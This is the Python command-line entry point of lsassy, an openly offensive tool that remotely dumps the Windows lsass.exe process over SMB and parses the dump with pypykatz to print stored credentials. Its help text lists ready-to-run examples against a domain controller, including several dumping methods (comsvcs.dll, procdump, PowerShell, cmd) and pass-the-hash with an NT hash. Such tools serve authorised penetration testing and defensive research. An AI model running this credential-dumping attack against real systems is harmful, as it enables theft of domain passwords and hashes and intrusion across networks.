#!/usr/bin/env python3
#
# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com

import pkg_resources
import sys
from pypykatz.pypykatz import pypykatz
from lsassy.impacketconnection import ImpacketConnection
from lsassy.impacketfile import ImpacketFile
from lsassy.parser import Parser
from lsassy.dumper import Dumper
from lsassy.log import Logger

version = pkg_resources.require("lsassy")[0].version


def run():
    import argparse

    examples = '''examples:
    
  ** RunDLL Dump Method **
  lsassy adsec.local/pixis:p4ssw0rd@dc01.adsec.local
  
  ** Try all methods **
  lsassy -m 0 adsec.local/pixis:p4ssw0rd@dc01.adsec.local

  ** Procdump Dump Method **
  lsassy -m 2 -p /tmp/procdump.exe adsec.local/pixis:p4ssw0rd@dc01.adsec.local
  
  ** Remote parsing only **
  lsassy --dumppath C$/Windows/Temp/lsass.dmp adsec.local/pixis:p4ssw0rd@dc01.adsec.local
  
  ** Output functions **
  lsassy -j -q localuser@desktop01.adsec.local
  lsassy -g --hashes 952c28bd2fd728898411b301475009b7 pixis@dc01.adsec.local'''

    parser = argparse.ArgumentParser(
        prog="lsassy",
        description='lsassy v{} - Remote lsass dump reader'.format(version),
        epilog=examples,
        formatter_class=argparse.RawTextHelpFormatter
    )

    group_auth = parser.add_argument_group('authentication')
    group_auth.add_argument('--hashes', action='store', help='[LM:]NT hash')
    group_out = parser.add_argument_group('output')
    group_out.add_argument('-j', '--json', action='store_true',help='Print credentials in JSON format')
    group_out.add_argument('-g', '--grep', action='store_true', help='Print credentials in greppable format')
    group_extract = parser.add_argument_group('remote parsing only')
    group_extract.add_argument('--dumppath', action='store', help='lsass dump path (Format : c$/Temp/lsass.dmp)')
    parser.add_argument('-m', '--method', action='store', default="1", help='''Dumping method
    0: Try all methods to dump procdump, stop on success (Requires -p if dll method fails)
    1: comsvcs.dll method, stop on success (default)
    2: Procdump method, stop on success (Requires -p)
    3: comsvcs.dll + Powershell method, stop on success
    4: comsvcs.dll + cmd.exe method''')
    parser.add_argument('--dumpname', action='store', help='Name given to lsass dump (Default: Random)')
    parser.add_argument('-p', '--procdump', action='store', help='Procdump path')
    parser.add_argument('-r', '--raw', action='store_true', help='No basic result filtering')
    parser.add_argument('-d', '--debug', action='store_true', help='Debug output')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode, only display credentials')
    parser.add_argument('-V', '--version', action='version', version='%(prog)s (version {})'.format(version))
    parser.add_argument('target', action='store', help='[domain/]username[:password]@<host>')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)

    args = parser.parse_args()

    logger = Logger(args.debug, args.quiet)

    conn = ImpacketConnection.from_args(args, logger)
    file_path = args.dumppath

    dumper = None

    if not args.dumppath:
        dumper = Dumper(conn, args, logger)
        file_path = dumper.dump()
        if not file_path:
            logger.error("lsass could not be dumped")
            exit()
        logger.success("Process lsass.exe is being dumped")

    ifile = ImpacketFile(logger)
    ifile.open(conn, file_path)
    dumpfile = pypykatz.parse_minidump_external(ifile)
    ifile.close()
    parser = Parser(dumpfile, logger)
    parser.output(args)

    if dumper is not None:
        dumper.clean()
    conn.close()


if __name__ == '__main__':
    run()
